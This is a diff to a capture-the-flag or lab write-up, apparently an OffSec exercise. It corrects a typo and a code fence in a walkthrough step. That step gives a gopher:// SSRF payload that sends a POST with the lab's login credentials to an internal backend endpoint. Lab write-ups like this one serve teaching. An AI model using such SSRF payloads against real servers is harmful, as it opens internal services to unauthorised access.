@@ -134,16 +134,16 @@ Answer - OS{followTheWhiteRabbit}
 - Try to SSRF on backend endpoint. Here you can see the login endpoint is listed.
 ![extra_mile_ssrf_backend_endpoint](images/extra_mile_ssrf_backend_endpoint.png)
 
-- Try using the Gopher protocol on the SSRF Sandbox for the login endpoint using the given username and password.
+- Try using the Gopher protocol on the SSRF Sandbox for the login endpoint using the given username and password.       
 Payload: 
 
 ```
-gopher://backend:80/_POST%20/login?username=white.rabbit&password=dontbelate%20HTTP/1.1%0a```
+gopher://backend:80/_POST%20/login?username=white.rabbit&password=dontbelate%20HTTP/1.1%0a
 ```
 
 ![extra_mile_gopher_ssrf](images/extra_mile_gopher_ssrf.png)
 
-- If you decode using URL deocder:
+- If you decode using URL decoder:
 ```
 gopher://backend:80/_POST /login?username=white.rabbit&password=dontbelate HTTP/1.1
 ```
